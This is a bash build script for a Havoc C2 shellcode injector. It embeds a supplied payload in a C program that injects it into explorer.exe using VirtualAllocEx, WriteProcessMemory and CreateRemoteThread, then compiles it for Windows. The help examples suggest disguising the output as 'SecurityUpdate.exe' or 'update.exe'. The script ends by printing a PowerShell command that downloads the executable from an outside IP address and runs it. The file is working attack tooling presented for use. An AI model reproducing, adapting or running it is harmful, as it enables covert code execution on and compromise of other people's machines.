#!/usr/bin/env bash

set -e

show_help() {
    cat << HELP
Usage: $(basename "$0") [OPTIONS]

Build a standalone Havoc shellcode injector with embedded payload.

OPTIONS:
    -s <path>    Path to shellcode.bin (required)
    -o <path>    Output executable path (required)
    -d <path>    Havoc installation directory (default: \$HOME/Havoc)
    -h           Show this help message

EXAMPLES:
    $(basename "$0") -s shellcode.bin -o update.exe
    $(basename "$0") -s ./payload.bin -o SecurityUpdate.exe -d /opt/Havoc
    $(basename "$0") -s shellcode.bin -o /tmp/beacon.exe

HELP
    exit 0
}

HAVOC_DIR="$HOME/Havoc"
SHELLCODE_BIN=""
OUTPUT_EXE=""

while getopts "s:o:d:h" opt; do
    case $opt in
        s) SHELLCODE_BIN="$OPTARG" ;;
        o) OUTPUT_EXE="$OPTARG" ;;
        d) HAVOC_DIR="$OPTARG" ;;
        h) show_help ;;
        *) show_help ;;
    esac
done

if [ -z "$SHELLCODE_BIN" ] || [ -z "$OUTPUT_EXE" ]; then
    echo "Error: -s (shellcode) and -o (output) are required"
    echo "Run with -h for help"
    exit 1
fi

if [ ! -f "$SHELLCODE_BIN" ]; then
    echo "Error: Shellcode file not found: $SHELLCODE_BIN"
    exit 1
fi

if [ ! -d "$HAVOC_DIR" ]; then
    echo "Error: Havoc directory not found: $HAVOC_DIR"
    exit 1
fi

COMPILER="$HAVOC_DIR/data/x86_64-w64-mingw32-cross/bin/x86_64-w64-mingw32-gcc"
if [ ! -x "$COMPILER" ]; then
    echo "Error: Compiler not found: $COMPILER"
    exit 1
fi

TEMP_ARRAY="/tmp/shellcode_array_$$.txt"
TEMP_TEMPLATE="/tmp/embedded_injector_$$.c"
TEMP_FINAL="/tmp/embedded_injector_final_$$.c"

echo "[+] Converting shellcode to C array format..."
xxd -p "$SHELLCODE_BIN" | tr -d '\n' | sed 's/../0x&, /g' | sed 's/, $//' | fold -w 78 > "$TEMP_ARRAY"

echo "[+] Generating C template..."
cat > "$TEMP_TEMPLATE" << 'CEOF'
#include <windows.h>
#include <tlhelp32.h>
#include <stdio.h>
#include <string.h>

unsigned char shellcode[] = {
SHELLCODE_BYTES_HERE
};

DWORD FindExplorerPID() {
    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snap == INVALID_HANDLE_VALUE) return 0;
    
    PROCESSENTRY32 pe;
    pe.dwSize = sizeof(pe);
    
    if (!Process32First(snap, &pe)) {
        CloseHandle(snap);
        return 0;
    }
    
    do {
        if (_stricmp(pe.szExeFile, "explorer.exe") == 0) {
            CloseHandle(snap);
            return pe.th32ProcessID;
        }
    } while (Process32Next(snap, &pe));
    
    CloseHandle(snap);
    return 0;
}

int main() {
    DWORD pid = FindExplorerPID();
    if (!pid) return 1;
    
    size_t size = sizeof(shellcode);
    
    HANDLE hProc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    if (!hProc) return 2;
    
    LPVOID addr = VirtualAllocEx(hProc, NULL, size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!addr) return 3;
    
    WriteProcessMemory(hProc, addr, shellcode, size, NULL);
    
    HANDLE hThread = CreateRemoteThread(hProc, NULL, 0, (LPTHREAD_START_ROUTINE)addr, NULL, 0, NULL);
    if (!hThread) return 4;
    
    CloseHandle(hThread);
    CloseHandle(hProc);
    
    return 0;
}
CEOF

echo "[+] Embedding shellcode into template..."
awk '/SHELLCODE_BYTES_HERE/ {system("cat '"$TEMP_ARRAY"'"); next} {print}' "$TEMP_TEMPLATE" > "$TEMP_FINAL"

echo "[+] Compiling with Havoc mingw toolchain..."
"$COMPILER" -o "$OUTPUT_EXE" "$TEMP_FINAL" -s

rm -f "$TEMP_ARRAY" "$TEMP_TEMPLATE" "$TEMP_FINAL"

if [ -f "$OUTPUT_EXE" ]; then
    SIZE=$(stat -f%z "$OUTPUT_EXE" 2>/dev/null || stat -c%s "$OUTPUT_EXE" 2>/dev/null)
    BASENAME=$(basename "$OUTPUT_EXE")
    echo "[+] Success! Compiled: $OUTPUT_EXE ($SIZE bytes)"
    echo "[+] Deploy with: IWR -Uri http://100.89.23.94:8002/$BASENAME -OutFile C:\\tmp\\$BASENAME; cd C:\\tmp; .\\$BASENAME"
else
    echo "[-] Compilation failed"
    exit 1
fi
